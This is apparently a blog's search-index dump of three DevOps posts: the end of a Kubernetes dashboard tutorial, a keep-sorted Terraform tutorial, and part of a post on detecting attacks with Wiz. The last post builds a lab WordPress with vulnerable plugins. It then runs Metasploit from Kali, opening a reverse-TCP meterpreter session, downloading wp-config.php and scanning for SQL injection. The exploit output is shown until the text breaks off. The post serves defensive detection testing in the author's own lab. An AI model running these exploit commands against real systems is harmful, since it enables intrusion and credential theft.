oauth2-proxy/oauth2-proxy Homepage Install Homepage to provide a nice dashboard. Install the homepage Helm chart and modify its default values: # renovate: datasource=helm depName=homepage registryUrl=http://jameswynn.github.io/helm-charts HOMEPAGE_HELM_CHART_VERSION=\"2.0.1\" helm repo add --force-update jameswynn http://jameswynn.github.io/helm-charts cat &gt; \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-homepage.yml\" &lt;&lt; EOF enableRbac: true serviceAccount: create: true ingress: main: enabled: true annotations: gethomepage.dev/enabled: \"true\" gethomepage.dev/name: Homepage gethomepage.dev/description: A modern, secure, highly customizable application dashboard gethomepage.dev/group: Apps gethomepage.dev/icon: homepage.png nginx.ingress.kubernetes.io/auth-url: https://oauth2-proxy.${CLUSTER_FQDN}/oauth2/auth nginx.ingress.kubernetes.io/auth-signin: https://oauth2-proxy.${CLUSTER_FQDN}/oauth2/start?rd=\\$scheme://\\$host\\$request_uri ingressClassName: \"nginx\" hosts: - host: ${CLUSTER_FQDN} paths: - path: / pathType: Prefix tls: - hosts: - ${CLUSTER_FQDN} config: bookmarks: services: widgets: - logo: icon: kubernetes.svg - kubernetes: cluster: show: true cpu: true memory: true showLabel: true label: \"${CLUSTER_NAME}\" nodes: show: true cpu: true memory: true showLabel: true kubernetes: mode: cluster settings: hideVersion: true title: ${CLUSTER_FQDN} favicon: https://raw.githubusercontent.com/homarr-labs/dashboard-icons/38631ad11695467d7a9e432d5fdec7a39a31e75f/svg/kubernetes.svg layout: Apps: icon: mdi-apps Observability: icon: mdi-chart-bell-curve-cumulative Cluster Management: icon: mdi-tools env: LOG_TARGETS: \"stdout\" EOF helm upgrade --install --version \"${HOMEPAGE_HELM_CHART_VERSION}\" --namespace homepage --create-namespace --values \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-homepage.yml\" homepage jameswynn/homepage Clean-up Disassociate a Route 53 Resolver query log configuration from an Amazon VPC: AWS_VPC_ID=$(aws ec2 describe-vpcs --filters \"Name=tag:alpha.eksctl.io/cluster-name,Values=${CLUSTER_NAME}\" --query 'Vpcs[*].VpcId' --output text) if [[ -n \"${AWS_VPC_ID}\" ]]; then AWS_CLUSTER_ROUTE53_RESOLVER_QUERY_LOG_CONFIG_ASSOCIATIONS_RESOLVER_QUERY_LOG_CONFIG_ID=$(aws route53resolver list-resolver-query-log-config-associations \\ --query \"ResolverQueryLogConfigAssociations[?ResourceId=='${AWS_VPC_ID}'].ResolverQueryLogConfigId\" --output text) if [[ -n \"${AWS_CLUSTER_ROUTE53_RESOLVER_QUERY_LOG_CONFIG_ASSOCIATIONS_RESOLVER_QUERY_LOG_CONFIG_ID}\" ]]; then aws route53resolver disassociate-resolver-query-log-config --resolver-query-log-config-id \"${AWS_CLUSTER_ROUTE53_RESOLVER_QUERY_LOG_CONFIG_ASSOCIATIONS_RESOLVER_QUERY_LOG_CONFIG_ID}\" --resource-id \"${AWS_VPC_ID}\" sleep 5 fi fi Clean up AWS Route 53 Resolver query log configurations: aws route53resolver list-resolver-query-log-configs --query \"ResolverQueryLogConfigs[?Name=='${CLUSTER_NAME}-vpc-dns-logs'].Id\" | jq -r '.[]' | while read -r AWS_CLUSTER_ROUTE53_RESOLVER_QUERY_LOG_CONFIG_ID; do aws route53resolver delete-resolver-query-log-config --resolver-query-log-config-id \"${AWS_CLUSTER_ROUTE53_RESOLVER_QUERY_LOG_CONFIG_ID}\" done Remove the EKS cluster and its created components: if eksctl get cluster --name=\"${CLUSTER_NAME}\"; then eksctl delete cluster --name=\"${CLUSTER_NAME}\" --force fi Remove the Route 53 DNS records from the DNS Zone: CLUSTER_FQDN_ZONE_ID=$(aws route53 list-hosted-zones --query \"HostedZones[?Name==\\`${CLUSTER_FQDN}.\\`].Id\" --output text) if [[ -n \"${CLUSTER_FQDN_ZONE_ID}\" ]]; then aws route53 list-resource-record-sets --hosted-zone-id \"${CLUSTER_FQDN_ZONE_ID}\" | jq -c '.ResourceRecordSets[] | select (.Type != \"SOA\" and .Type != \"NS\")' | while read -r RESOURCERECORDSET; do aws route53 change-resource-record-sets \\ --hosted-zone-id \"${CLUSTER_FQDN_ZONE_ID}\" \\ --change-batch '{\"Changes\":[{\"Action\":\"DELETE\",\"ResourceRecordSet\": '\"${RESOURCERECORDSET}\"' }]}' \\ --output text --query 'ChangeInfo.Id' done fi Remove the CloudFormation stack: aws cloudformation delete-stack --stack-name \"${CLUSTER_NAME}-route53-kms\" aws cloudformation wait stack-delete-complete --stack-name \"${CLUSTER_NAME}-route53-kms\" aws cloudformation wait stack-delete-complete --stack-name \"eksctl-${CLUSTER_NAME}-cluster\" Remove volumes and snapshots related to the cluster (as a precaution): for VOLUME in $(aws ec2 describe-volumes --filter \"Name=tag:KubernetesCluster,Values=${CLUSTER_NAME}\" \"Name=tag:kubernetes.io/cluster/${CLUSTER_NAME},Values=owned\" --query 'Volumes[].VolumeId' --output text); do echo \"*** Removing Volume: ${VOLUME}\" aws ec2 delete-volume --volume-id \"${VOLUME}\" done Remove the CloudWatch log group: if [[ \"$(aws logs describe-log-groups --query \"logGroups[?logGroupName==\\`/aws/eks/${CLUSTER_NAME}/cluster\\`] | [0].logGroupName\" --output text)\" = \"/aws/eks/${CLUSTER_NAME}/cluster\" ]]; then aws logs delete-log-group --log-group-name \"/aws/eks/${CLUSTER_NAME}/cluster\" fi Remove the ${TMP_DIR}/${CLUSTER_FQDN} directory: if [[ -d \"${TMP_DIR}/${CLUSTER_FQDN}\" ]]; then for FILE in \"${TMP_DIR}/${CLUSTER_FQDN}\"/{kubeconfig-${CLUSTER_NAME}.conf,{aws-cf-route53-kms,eksctl-${CLUSTER_NAME},k8s-storage-storageclass,k8s-karpenter-nodepool,k8s-eks-nodeclass,helm_values-{cert-manager,external-dns,homepage,ingress-nginx,kube-prometheus-stack,mailpit,oauth2-proxy},k8s-cert-manager-{certificate,clusterissuer}-staging}.yml}; do if [[ -f \"${FILE}\" ]]; then rm -v \"${FILE}\" else echo \"*** File not found: ${FILE}\" fi done rmdir \"${TMP_DIR}/${CLUSTER_FQDN}\" fi Enjoy … 😉" }, { "title": "Using keep-sorted to organize Terraform objects", "url": "/posts/terraform-keep-sorted/", "categories": "DevOps", "tags": "terraform", "date": "2024-12-12 00:00:00 +0100", "content": "Alphabetically sorting variables, sets, arrays, and other strings has long been considered good practice, not just in Terraform/OpenTofu code. I want to explore how to sort Terraform/OpenTofu resources, outputs, lists, and more using a dedicated tool. I will explain how to use keep-sorted from Google to maintain well-organized and properly sorted Terraform/OpenTofu code. Rather than diving into a lengthy description of keep-sorted’s features, let’s explore some examples. Install keep-sorted by following these steps: TMP_DIR=\"${TMP_DIR:-${PWD}}\" mkdir -pv \"${TMP_DIR}\" wget -q \"https://github.com/google/keep-sorted/releases/download/v0.6.1/keep-sorted_$(uname | tr '[:upper:]' '[:lower:]')\" -O \"${TMP_DIR}/keep-sorted\" chmod +x \"${TMP_DIR}/keep-sorted\" Let’s consider an example data.tf file: tee \"${TMP_DIR}/data.tf\" &lt;&lt; EOF # keep-sorted start block=yes newline_separated=yes # [APIGateway-007] REST API Gateway 7 data \"wiz_cloud_configuration_rules\" \"apigateway-007\" { search = \"APIGateway-007\" } # [APIGateway-001] REST API Gateway 1 data \"wiz_cloud_configuration_rules\" \"apigateway-001\" { search = \"APIGateway-001\" } # [APIGateway-009] REST API Gateway 9 data \"wiz_cloud_configuration_rules\" \"apigateway-009\" { search = \"APIGateway-009\" } # [APIGateway-002] REST API Gateway 2 data \"wiz_cloud_configuration_rules\" \"apigateway-002\" { search = \"APIGateway-002\" } # keep-sorted end EOF Let’s check the output after applying keep-sorted: \"${TMP_DIR}/keep-sorted\" \"${TMP_DIR}/data.tf\" &amp;&amp; cat \"${TMP_DIR}/data.tf\" # keep-sorted start block=yes newline_separated=yes # [APIGateway-001] REST API Gateway 1 data \"wiz_cloud_configuration_rules\" \"apigateway-001\" { search = \"APIGateway-001\" } # [APIGateway-002] REST API Gateway 2 data \"wiz_cloud_configuration_rules\" \"apigateway-002\" { search = \"APIGateway-002\" } # [APIGateway-007] REST API Gateway 7 data \"wiz_cloud_configuration_rules\" \"apigateway-007\" { search = \"APIGateway-007\" } # [APIGateway-009] REST API Gateway 9 data \"wiz_cloud_configuration_rules\" \"apigateway-009\" { search = \"APIGateway-009\" } # keep-sorted end Diff: keep-sorted data.tf diff As you can see in the output above: The data resources were sorted alphabetically by their names The comments associated with each data source were preserved and moved along with their respective blocks Here’s one more example, this time with a main.tf file: tee \"${TMP_DIR}/main.tf\" &lt;&lt; EOF locals { # keep-sorted start block=yes numeric=yes wiz_cloud_configuration_rules_20 = [ # keep-sorted start data.wiz_cloud_configuration_rules.apigateway-02.id, data.wiz_cloud_configuration_rules.apigateway-01.id, data.wiz_cloud_configuration_rules.apigateway-09.id, data.wiz_cloud_configuration_rules.apigateway-07.id, # keep-sorted end ] wiz_cloud_configuration_rules_5 = [ # keep-sorted start data.wiz_cloud_configuration_rules.apigateway-10.id, data.wiz_cloud_configuration_rules.apigateway-2.id, data.wiz_cloud_configuration_rules.apigateway-27.id, data.wiz_cloud_configuration_rules.apigateway-1.id, # keep-sorted end ] # keep-sorted end } EOF …and the resulting output is: \"${TMP_DIR}/keep-sorted\" \"${TMP_DIR}/main.tf\" &amp;&amp; cat \"${TMP_DIR}/main.tf\" locals { # keep-sorted start block=yes numeric=yes wiz_cloud_configuration_rules_5 = [ # keep-sorted start data.wiz_cloud_configuration_rules.apigateway-1.id, data.wiz_cloud_configuration_rules.apigateway-10.id, data.wiz_cloud_configuration_rules.apigateway-2.id, data.wiz_cloud_configuration_rules.apigateway-27.id, # keep-sorted end ] wiz_cloud_configuration_rules_20 = [ # keep-sorted start data.wiz_cloud_configuration_rules.apigateway-01.id, data.wiz_cloud_configuration_rules.apigateway-02.id, data.wiz_cloud_configuration_rules.apigateway-07.id, data.wiz_cloud_configuration_rules.apigateway-09.id, # keep-sorted end ] # keep-sorted end } Diff: keep-sorted main.tf diff keep-sorted has several other features documented in its README.md. As I mentioned before, it’s not limited to use with only Terraform/OpenTofu. Cleanup Delete all created files using the following command: rm -v \"${TMP_DIR}\"/{data,main}.tf \"${TMP_DIR}/keep-sorted\" Enjoy … 😉" }, { "title": "Detect the hacker attacks on Amazon EKS and EC2 instances", "url": "/posts/detect-a-hacker-attacks-eks-vm/", "categories": "Kubernetes, Cloud, Security", "tags": "amazon-eks, kubernetes, security, exploit, vulnerability, kali-linux, docker, ec2", "date": "2024-07-07 00:00:00 +0200", "content": "In previous posts, 1 and 2, I demonstrated how to exploit a vulnerability in a WordPress plugin running on Amazon EKS, EC2, and EC2 with Docker instances using Kali Linux and Metasploit. In this post, I would like to explore how to detect hacker attacks using the Wiz security tool. I will cover the following steps: Install a vulnerable WordPress application and plugin to Amazon EKS, EC2, and EC2+Docker instances Secure the Amazon EKS and EC2 instances using a security tool Exploit a vulnerability in a WordPress plugin using Kali Linux and Metasploit Summarize the detection results Architecture diagram: Kali Linux attacks WordPress on EKS, VM, and VM with Docker Build the Amazon EKS, EC2 instances with Wordpress Application and Kali Linux This section contains the commands needed to build the Amazon EKS and EC2 instances with the vulnerable WordPress application. I will not cover all the details, as they were already described in previous posts 1 and 2. Requirements: AWS CLI rain eksctl kubectl helm I will cover only the necessary commands here, without detailed descriptions. # export AWS_ACCESS_KEY_ID=\"xxxxxxxxxxxxxxxxxx\" # export AWS_SECRET_ACCESS_KEY=\"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\" export AWS_DEFAULT_REGION=\"eu-central-1\" AWS_EC2_KEY_PAIR_NAME=\"wordpress-test\" TMP_DIR=\"${TMP_DIR:-${PWD}}\" WORDPRESS_USERNAME=\"wordpress\" WORDPRESS_PASSWORD=$(openssl rand -base64 12) MARIADB_WORDPRESS_DATABASE=\"wordpress\" MARIADB_WORDPRESS_DATABASE_USER=\"wordpress\" MARIADB_WORDPRESS_DATABASE_PASSWORD=$(openssl rand -base64 12) MARIADB_ROOT_PASSWORD=$(openssl rand -base64 12) ## Download the CloudFormation templates # renovate: currentValue=master wget --continue -q -P \"${TMP_DIR}\" https://raw.githubusercontent.com/aws-samples/aws-codebuild-samples/00284b828a360aa89ac635a44d84c5a748af03d3/ci_tools/vpc_cloudformation_template.yml # renovate: wget --continue -q -P \"${TMP_DIR}\" https://raw.githubusercontent.com/aws-samples/amazon-ec2-nice-dcv-samples/9ae94412ff1b4da8eb947516f84a17b11226d174/cfn/KaliLinux-NICE-DCV.yaml # renovate: wget --continue -q -P \"${TMP_DIR}\" https://raw.githubusercontent.com/aws-samples/ec2-lamp-server/1f3539b5dc2745a974c99a3ed911da00f59534bd/AmazonLinux-2023-LAMP-server.yaml ## Create a new AWS EC2 Key Pair to be used for the EC2 instances aws ec2 create-key-pair --key-name \"${AWS_EC2_KEY_PAIR_NAME}\" --key-type ed25519 --query \"KeyMaterial\" --output text &gt; \"${TMP_DIR}/${AWS_EC2_KEY_PAIR_NAME}.pem\" chmod 600 \"${TMP_DIR}/${AWS_EC2_KEY_PAIR_NAME}.pem\" Amazon EKS with Wordpress Install the Amazon EKS cluster using eksctl, run the vulnerable WordPress application, and connect the cluster to Wiz. export CLUSTER_NAME=\"Amazon-EKS\" export KUBECONFIG=\"${TMP_DIR}/kubeconfig-${CLUSTER_NAME}.conf\" eksctl create cluster \\ --name \"${CLUSTER_NAME}\" --tags \"Owner=${USER},Solution=${CLUSTER_NAME},Cluster=${CLUSTER_NAME}\" \\ --node-type t3a.medium --node-volume-size 20 --node-private-networking \\ --kubeconfig \"${KUBECONFIG}\" ## Install vulnerable Wordpress Application to the Amazon EKS cluster using a Helm chart and modify its default values WORDPRESS_HELM_CHART_VERSION=\"22.1.3\" tee \"${TMP_DIR}/helm_values-wordpress.yml\" &lt;&lt; EOF wordpressUsername: wordpress wordpressPassword: $(openssl rand -base64 12) customPostInitScripts: install_plugins.sh: | wp plugin install backup-backup --version=1.3.7 --activate wp plugin install loginizer --version=1.6.3 --activate persistence: enabled: false mariadb: primary: persistence: enabled: false EOF helm upgrade --install --version \"${WORDPRESS_HELM_CHART_VERSION}\" --namespace wordpress --create-namespace --wait --values \"${TMP_DIR}/helm_values-wordpress.yml\" wordpress oci://registry-1.docker.io/bitnamicharts/wordpress K8S_WORDPRESS_SERVICE=$(kubectl get services --namespace wordpress wordpress --output jsonpath='{.status.loadBalancer.ingress[0].hostname}') ## Install Wiz Kubernetes Integration export WIZ_API_CLIENT_ID=\"xxxx\" export WIZ_API_CLIENT_SECRET=\"xxxx\" export WIZ_SENSOR_CONTAINER_REGISTRY_USERNAME=\"xxxx\" export WIZ_SENSOR_CONTAINER_REGISTRY_PASSWORD=\"xxxx\" helm repo add --force-update wiz-sec https://charts.wiz.io/ helm upgrade --install --namespace wiz --create-namespace --values - wiz-kubernetes-integration wiz-sec/wiz-kubernetes-integration &lt;&lt; EOF global: wizApiToken: clientId: \"${WIZ_API_CLIENT_ID}\" clientToken: \"${WIZ_API_CLIENT_SECRET}\" wiz-kubernetes-connector: enabled: true autoCreateConnector: connectorName: \"${CLUSTER_NAME}\" clusterFlavor: EKS wiz-admission-controller: enabled: true kubernetesAuditLogsWebhook: enabled: true wiz-sensor: enabled: true imagePullSecret: username: \"${WIZ_SENSOR_CONTAINER_REGISTRY_USERNAME}\" password: \"${WIZ_SENSOR_CONTAINER_REGISTRY_PASSWORD}\" sensorClusterName: ${CLUSTER_NAME} EOF Amazon EC2 with Wordpress container Create a new Amazon Linux 2023 EC2 instance, install Docker, and run a WordPress container. export SOLUTION_EC2_CONTAINER=\"Amazon-EC2-Container\" rain deploy --yes \"${TMP_DIR}/vpc_cloudformation_template.yml\" \"${SOLUTION_EC2_CONTAINER}-VPC\" \\ --params \"EnvironmentName=${SOLUTION_EC2_CONTAINER}\" \\ --tags \"Owner=${USER},Environment=dev,Solution=${SOLUTION_EC2_CONTAINER}\" AWS_CLOUDFORMATION_DETAILS=$(aws cloudformation describe-stacks --stack-name \"${SOLUTION_EC2_CONTAINER}-VPC\" --query \"Stacks[0].Outputs[? OutputKey==\\`PublicSubnet1\\` || OutputKey==\\`VPC\\`].{OutputKey:OutputKey,OutputValue:OutputValue}\") AWS_VPC_ID=$(echo \"${AWS_CLOUDFORMATION_DETAILS}\" | jq -r \".[] | select(.OutputKey==\\\"VPC\\\") .OutputValue\") AWS_SUBNET_ID=$(echo \"${AWS_CLOUDFORMATION_DETAILS}\" | jq -r \".[] | select(.OutputKey==\\\"PublicSubnet1\\\") .OutputValue\") rain deploy --node-style original --yes \"${TMP_DIR}/AmazonLinux-2023-LAMP-server.yaml\" \"${SOLUTION_EC2_CONTAINER}\" \\ --params \"instanceType=t4g.medium,ec2Name=${SOLUTION_EC2_CONTAINER},ec2KeyPair=${AWS_EC2_KEY_PAIR_NAME},vpcID=${AWS_VPC_ID},subnetID=${AWS_SUBNET_ID},ec2TerminationProtection=No,webOption=none,databaseOption=none,phpVersion=none\" \\ --tags \"Owner=${USER},Environment=dev,Solution=${SOLUTION_EC2_CONTAINER}\" AWS_EC2_CONTAINER_PUBLIC_IP=$(aws ec2 describe-instances --filters \"Name=tag:Solution,Values=${SOLUTION_EC2_CONTAINER}\" --query \"Reservations[].Instances[].PublicIpAddress\" --output text) ssh -i \"${TMP_DIR}/${AWS_EC2_KEY_PAIR_NAME}.pem\" -o StrictHostKeyChecking=no \"ec2-user@${AWS_EC2_CONTAINER_PUBLIC_IP}\" 'curl -Ls https://github.com/ruzickap.keys &gt;&gt; ~/.ssh/authorized_keys' ## Install Docker and Docker Compose on the instance ssh -i \"${TMP_DIR}/${AWS_EC2_KEY_PAIR_NAME}.pem\" -o StrictHostKeyChecking=no \"ec2-user@${AWS_EC2_CONTAINER_PUBLIC_IP}\" &lt;&lt; \\EOF set -euxo pipefail sudo dnf install -qy docker sudo usermod -aG docker ec2-user sudo systemctl enable --now docker sudo mkdir -p /usr/local/lib/docker/cli-plugins sudo curl -sL https://github.com/docker/compose/releases/latest/download/docker-compose-linux-$(uname -m) -o /usr/local/lib/docker/cli-plugins/docker-compose sudo chown root:root /usr/local/lib/docker/cli-plugins/docker-compose sudo chmod +x /usr/local/lib/docker/cli-plugins/docker-compose EOF ## Install Wordpress in a container with the vulnerable WordPress Backup Migration Plugin and Loginizer plugins # shellcheck disable=SC2087 ssh -i \"${TMP_DIR}/${AWS_EC2_KEY_PAIR_NAME}.pem\" -o StrictHostKeyChecking=no \"ec2-user@${AWS_EC2_CONTAINER_PUBLIC_IP}\" &lt;&lt; EOF2 set -euxo pipefail mkdir -p docker-entrypoint-init.d cat &gt; docker-entrypoint-init.d/wordpress_plugin_install.sh &lt;&lt; EOF wp plugin install backup-backup --version=1.3.7 --activate wp plugin install loginizer --version=1.6.3 --activate EOF chmod a+x docker-entrypoint-init.d/wordpress_plugin_install.sh cat &gt; docker-compose.yml &lt;&lt; EOF services: mariadb: # renovate: datasource=docker depName=bitnami/mariadb image: docker.io/bitnami/mariadb:11.2 volumes: - 'mariadb_data:/bitnami/mariadb' environment: - ALLOW_EMPTY_PASSWORD=no - MARIADB_USER=${MARIADB_WORDPRESS_DATABASE_USER} - MARIADB_DATABASE=${MARIADB_WORDPRESS_DATABASE} - MARIADB_PASSWORD=${MARIADB_WORDPRESS_DATABASE_PASSWORD} - MARIADB_ROOT_PASSWORD=${MARIADB_ROOT_PASSWORD} wordpress: image: docker.io/bitnami/wordpress:6 ports: - '80:8080' - '443:8443' volumes: - 'wordpress_data:/bitnami/wordpress' - '\\${PWD}/docker-entrypoint-init.d:/docker-entrypoint-init.d' depends_on: - mariadb environment: - ALLOW_EMPTY_PASSWORD=no - WORDPRESS_USERNAME=${WORDPRESS_USERNAME} - WORDPRESS_PASSWORD=${WORDPRESS_PASSWORD} - WORDPRESS_DATABASE_HOST=mariadb - WORDPRESS_DATABASE_PORT_NUMBER=3306 - WORDPRESS_DATABASE_USER=${MARIADB_WORDPRESS_DATABASE_USER} - WORDPRESS_DATABASE_PASSWORD=${MARIADB_WORDPRESS_DATABASE_PASSWORD} - WORDPRESS_DATABASE_NAME=${MARIADB_WORDPRESS_DATABASE} volumes: mariadb_data: driver: local wordpress_data: driver: local EOF docker compose up --quiet-pull -d ## Install Wiz Sensor # shellcheck disable=SC2034 export WIZ_API_CLIENT_ID=\"${WIZ_API_CLIENT_ID}\" # shellcheck disable=SC2034 export WIZ_API_CLIENT_SECRET=\"${WIZ_API_CLIENT_SECRET}\" curl -sL https://downloads.wiz.io/sensor/sensor_install.sh | sudo -E bash EOF2 Amazon EC2 with Wordpress Launch a new Amazon Linux 2023 EC2 instance for a standalone WordPress installation. export SOLUTION_EC2=\"Amazon-EC2\" rain deploy --yes \"${TMP_DIR}/vpc_cloudformation_template.yml\" \"${SOLUTION_EC2}-VPC\" \\ --params \"EnvironmentName=${SOLUTION_EC2}\" \\ --tags \"Owner=${USER},Environment=dev,Solution=${SOLUTION_EC2}\" AWS_CLOUDFORMATION_DETAILS=$(aws cloudformation describe-stacks --stack-name \"${SOLUTION_EC2}-VPC\" --query \"Stacks[0].Outputs[? OutputKey==\\`PublicSubnet1\\` || OutputKey==\\`VPC\\`].{OutputKey:OutputKey,OutputValue:OutputValue}\") AWS_VPC_ID=$(echo \"${AWS_CLOUDFORMATION_DETAILS}\" | jq -r \".[] | select(.OutputKey==\\\"VPC\\\") .OutputValue\") AWS_SUBNET_ID=$(echo \"${AWS_CLOUDFORMATION_DETAILS}\" | jq -r \".[] | select(.OutputKey==\\\"PublicSubnet1\\\") .OutputValue\") rain deploy --node-style original --yes \"${TMP_DIR}/AmazonLinux-2023-LAMP-server.yaml\" \"${SOLUTION_EC2}\" \\ --params \"instanceType=t4g.medium,ec2Name=${SOLUTION_EC2},ec2KeyPair=${AWS_EC2_KEY_PAIR_NAME},vpcID=${AWS_VPC_ID},subnetID=${AWS_SUBNET_ID},ec2TerminationProtection=No\" \\ --tags \"Owner=${USER},Environment=dev,Solution=${SOLUTION_EC2}\" AWS_EC2_PUBLIC_IP=$(aws ec2 describe-instances --filters \"Name=tag:Solution,Values=${SOLUTION_EC2}\" --query \"Reservations[].Instances[].PublicIpAddress\" --output text) ssh -i \"${TMP_DIR}/${AWS_EC2_KEY_PAIR_NAME}.pem\" -o StrictHostKeyChecking=no \"ec2-user@${AWS_EC2_PUBLIC_IP}\" 'curl -Ls https://github.com/ruzickap.keys &gt;&gt; ~/.ssh/authorized_keys' ## Configure MariaDB and add a \"wordpress\" user with a password # shellcheck disable=SC2087 ssh -i \"${TMP_DIR}/${AWS_EC2_KEY_PAIR_NAME}.pem\" -o StrictHostKeyChecking=no \"ec2-user@${AWS_EC2_PUBLIC_IP}\" &lt;&lt; EOF2 set -euxo pipefail sudo mysql --user=root &lt;&lt; \\EOF UPDATE mysql.global_priv SET priv=json_set(priv, '$.plugin', 'mysql_native_password', '$.authentication_string', PASSWORD('${MARIADB_ROOT_PASSWORD}')) WHERE User='root'; DELETE FROM mysql.user WHERE User='root' AND Host NOT IN ('localhost', '127.0.0.1', '::1'); DELETE FROM mysql.global_priv WHERE User=''; DROP DATABASE IF EXISTS test; DELETE FROM mysql.db WHERE Db='test' OR Db='test\\\\_%'; CREATE USER '${MARIADB_WORDPRESS_DATABASE_USER}'@'localhost' IDENTIFIED BY '${MARIADB_WORDPRESS_DATABASE_PASSWORD}'; GRANT ALL PRIVILEGES ON ${MARIADB_WORDPRESS_DATABASE}.* TO '${MARIADB_WORDPRESS_DATABASE_USER}'@'localhost'; FLUSH PRIVILEGES; EOF ## Install Wordpress with the vulnerable WordPress Backup Migration Plugin and Loginizer plugins # shellcheck disable=SC2087 wget -q https://raw.githubusercontent.com/wp-cli/builds/gh-pages/phar/wp-cli.phar chmod +x wp-cli.phar sudo mv wp-cli.phar /usr/local/bin/wp cd /var/www/html/ wp core download --version=6.5.3 wp config create --dbname=\"${MARIADB_WORDPRESS_DATABASE}\" --dbuser=\"${MARIADB_WORDPRESS_DATABASE_USER}\" --dbpass=\"${MARIADB_WORDPRESS_DATABASE_PASSWORD}\" wp db create wp core install --url=\"${AWS_EC2_PUBLIC_IP}\" --title=\"My Blog\" --admin_user=\"${WORDPRESS_USERNAME}\" --admin_password=\"${WORDPRESS_PASSWORD}\" --skip-email --admin_email=\"info@example.com\" wp plugin install backup-backup --version=1.3.7 --activate wp plugin install loginizer --version=1.6.3 --activate ## Install Wiz Sensor # shellcheck disable=SC2034 export WIZ_API_CLIENT_ID=\"${WIZ_API_CLIENT_ID}\" # shellcheck disable=SC2034 export WIZ_API_CLIENT_SECRET=\"${WIZ_API_CLIENT_SECRET}\" curl -sL https://downloads.wiz.io/sensor/sensor_install.sh | sudo -E bash EOF2 AWS EC2 instance with Kali Linux Launch an AWS EC2 instance with Kali Linux using a CloudFormation template. export SOLUTION_KALI=\"KaliLinux-NICE-DCV\" rain deploy --yes \"${TMP_DIR}/vpc_cloudformation_template.yml\" \"${SOLUTION_KALI}-VPC\" \\ --params \"EnvironmentName=${SOLUTION_KALI}\" \\ --tags \"Owner=${USER},Environment=dev,Solution=${SOLUTION_KALI}\" AWS_CLOUDFORMATION_DETAILS=$(aws cloudformation describe-stacks --stack-name \"${SOLUTION_KALI}-VPC\" --query \"Stacks[0].Outputs[? OutputKey==\\`PublicSubnet1\\` || OutputKey==\\`VPC\\`].{OutputKey:OutputKey,OutputValue:OutputValue}\") AWS_VPC_ID=$(echo \"${AWS_CLOUDFORMATION_DETAILS}\" | jq -r \".[] | select(.OutputKey==\\\"VPC\\\") .OutputValue\") AWS_SUBNET_ID=$(echo \"${AWS_CLOUDFORMATION_DETAILS}\" | jq -r \".[] | select(.OutputKey==\\\"PublicSubnet1\\\") .OutputValue\") rain deploy --yes --node-style original \"${TMP_DIR}/KaliLinux-NICE-DCV.yaml\" \"${SOLUTION_KALI}\" \\ --params \"ec2KeyPair=${AWS_EC2_KEY_PAIR_NAME},vpcID=${AWS_VPC_ID},subnetID=${AWS_SUBNET_ID},ec2TerminationProtection=No,allowWebServerPorts=HTTP-and-HTTPS\" \\ --tags \"Owner=${USER},Environment=dev,Solution=${SOLUTION_KALI}\" Attack the Wordpress Application from Kali Linux The following section describes using the Metasploit Framework to exploit vulnerabilities in the WordPress Backup Migration Plugin and Loginizer plugins. Allow your user to connect to the Kali Linux instance using SSH and then install Metasploit: AWS_EC2_KALI_LINUX_PUBLIC_IP=$(aws ec2 describe-instances --filters \"Name=tag:Solution,Values=${SOLUTION_KALI}\" --query \"Reservations[].Instances[].PublicIpAddress\" --output text) ssh -i \"${TMP_DIR}/${AWS_EC2_KEY_PAIR_NAME}.pem\" -o StrictHostKeyChecking=no \"kali@${AWS_EC2_KALI_LINUX_PUBLIC_IP}\" 'curl -Ls https://github.com/ruzickap.keys &gt;&gt; ~/.ssh/authorized_keys' scp -i \"${TMP_DIR}/${AWS_EC2_KEY_PAIR_NAME}.pem\" -o StrictHostKeyChecking=no \"${TMP_DIR}/${AWS_EC2_KEY_PAIR_NAME}.pem\" \"kali@${AWS_EC2_KALI_LINUX_PUBLIC_IP}:~\" ssh -i \"${TMP_DIR}/${AWS_EC2_KEY_PAIR_NAME}.pem\" -o StrictHostKeyChecking=no \"kali@${AWS_EC2_KALI_LINUX_PUBLIC_IP}\" &lt;&lt; EOF touch ~/.hushlogin sudo snap install metasploit-framework msfdb init EOF Run the Metasploit Framework and exploit the vulnerability in all three environments (EKS, a standalone EC2 instance, and EC2 with Docker): # shellcheck disable=SC2087 for PUBLIC_IP in ${K8S_WORDPRESS_SERVICE} ${AWS_EC2_PUBLIC_IP} ${AWS_EC2_CONTAINER_PUBLIC_IP}; do echo \"*** ${PUBLIC_IP}\" ssh -i \"${TMP_DIR}/${AWS_EC2_KEY_PAIR_NAME}.pem\" -o StrictHostKeyChecking=no \"kali@${AWS_EC2_KALI_LINUX_PUBLIC_IP}\" &lt;&lt; EOF2 cat &lt;&lt; EOF | msfconsole --quiet --resource - use exploit/multi/http/wp_backup_migration_php_filter set rhost ${PUBLIC_IP} set lhost ${AWS_EC2_KALI_LINUX_PUBLIC_IP} set lport 443 run --no-interact sessions --interact 1 --meterpreter-command ps --meterpreter-command sysinfo \\ --meterpreter-command \"download /bitnami/wordpress/wp-config.php\" use auxiliary/scanner/http/wp_loginizer_log_sqli set rhost ${PUBLIC_IP} set verbose true run exit -y EOF EOF2 done The output below was condensed to display only the attack against WordPress on Amazon EKS: ... resource (stdin)&gt; use exploit/multi/http/wp_backup_migration_php_filter [*] No payload configured, defaulting to php/meterpreter/reverse_tcp resource (stdin)&gt; set rhost a8fe9c409fcee4d7bbcbd9cab63193f8-449369653.eu-central-1.elb.amazonaws.com rhost =&gt; a8fe9c409fcee4d7bbcbd9cab63193f8-449369653.eu-central-1.elb.amazonaws.com resource (stdin)&gt; set lhost 52.57.199.153 lhost =&gt; 52.57.199.153 resource (stdin)&gt; set lport 443 lport =&gt; 443 resource (stdin)&gt; run --no-interact [*] Exploiting target 3.120.120.128 [-] Handler failed to bind to 52.57.199.153:443:- - [*] Started reverse TCP handler on 0.0.0.0:443 [*] Running automatic check (\"set AutoCheck false\" to disable) [*] WordPress Version: 6.5 [+] Detected Backup Migration Plugin version: 1.3.7 [+] The target appears to be vulnerable. [*] Sending the payload, please wait... [*] Sending stage (39927 bytes) to 3.124.173.56 [*] Meterpreter session 1 opened (10.192.10.244:443 -&gt; 3.124.173.56:61739) at 2024-11-23 09:22:05 +0000 [*] Session 1 created in the background. [*] Exploiting target 18.195.11.191 [-] Handler failed to bind to 52.57.199.153:443:- - [*] Started reverse TCP handler on 0.0.0.0:443 [*] Running automatic check (\"set AutoCheck false\" to disable) [*] WordPress Version: 6.5 [+] Detected Backup Migration Plugin version: 1.3.7 [+] The target appears to be 